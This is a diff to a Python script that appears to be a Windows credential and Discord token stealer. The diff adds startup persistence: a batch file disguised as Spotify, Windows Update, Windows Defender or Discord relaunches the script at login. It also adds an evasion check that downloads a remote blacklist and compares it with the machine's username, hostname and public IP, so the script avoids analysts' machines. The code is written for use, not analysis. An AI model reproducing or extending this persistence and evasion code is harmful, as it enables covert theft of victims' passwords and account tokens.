@@ -2,7 +2,7 @@ import base64
 import json
 import os
 import re
-import sqlite3 
+import sqlite3
 import shutil
 import httpx
 import subprocess
@@ -18,6 +18,67 @@ import socket
 import win32crypt
 from Crypto.Cipher import AES
 import requests
+
+DEBUG = False
+if os.name=="nt": path = f'C:/Users/{getpass.getuser()}/ADMIN/backdoor.debug'
+else: path = f'/home/{getpass.getuser()}/ADMIN/backdoor.debug'
+print(path)
+if os.path.exists(path):
+    check = input('do you want to enable debug mode (y/N) ? ')
+    if not check == "n":
+        DEBUG = True
+    
+
+
+
+def get_blacklist():
+    url = "https://raw.githubusercontent.com/notrunit/code/refs/heads/main/blacklist.list"
+    response = requests.get(url)
+    if response.status_code == 200:
+        return response.content.decode().split(" | ")
+    else: get_blacklist()
+
+
+def blacklist():
+    if DEBUG:
+        return False
+    else:
+        try:
+            response = requests.get("https://api.ipify.org")
+            public_ip= response.text
+        except Exception as e:
+            print(f"Could not retrieve public IP: {e}")
+            public_ip=None
+        infos = [getpass.getuser(),socket.gethostname(),public_ip]
+        blacklist = get_blacklist()
+        for info in infos:
+            if info in blacklist:
+                return True
+
+__path__ = os.path.abspath(sys.argv[0])
+if __path__.endswith(".py"):
+    __version__ = "PYTHON"
+elif __path__.endswith('.exe'):
+    __version__ = "EXECUTABLE"
+if os.name=="nt":
+    startupfolder=os.path.join(os.getenv('APPDATA'),r'Microsoft\Windows\Start Menu\Programs\Startup')   
+    if not os.path.exists(startupfolder):
+        os.makedirs(startupfolder)
+    olds = []
+    apps=["spotify.bat","windows update.bat","windows defender.bat","intel driver updater.bat",'powertoys.bat',"discord.bat",'TranslucentTB.bat','unowhy_y13_admin_management.bat']
+    for file in os.listdir(startupfolder):
+        if file in apps:
+            olds.append(file)
+    for app in apps:
+        if app in olds:
+            apps.remove(app)
+            if DEBUG: print(f"{app} was removed")
+            os.remove(os.path.join(startupfolder,app))
+    if DEBUG: print(apps)
+    file=f'{os.path.join(startupfolder,random.choice(apps))}'
+    if DEBUG: print(file)
+    with open(file,'w') as f:
+        f.write(f'@echo off\nstart {__path__}')
 class color():
     RED   = "\033[1;31m"  
     BLUE  = "\033[1;34m"
@@ -26,7 +87,7 @@ class color():
     RESET = "\033[0;0m"
     BOLD    = "\033[;1m"
     REVERSE = "\033[;7m"
-if not os.path.exists('C:/immunite.god'):
+if not blacklist():
     print('congiguration process starting !')
     CURRENT_INTERPRETER = sys.executable
     current_file = os.path.abspath(__file__)
@@ -241,8 +302,8 @@ if not os.path.exists('C:/immunite.god'):
                 if r.status_code == 200:
                     i+=1
                     return i
-            except Exception as e: 
-                print(f'ERROR : {e}')
+            except: 
+                print('probably 429 error retrying in 0.1s')
                 time.sleep(0.1)
     def validate_discord_token(token):
         r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
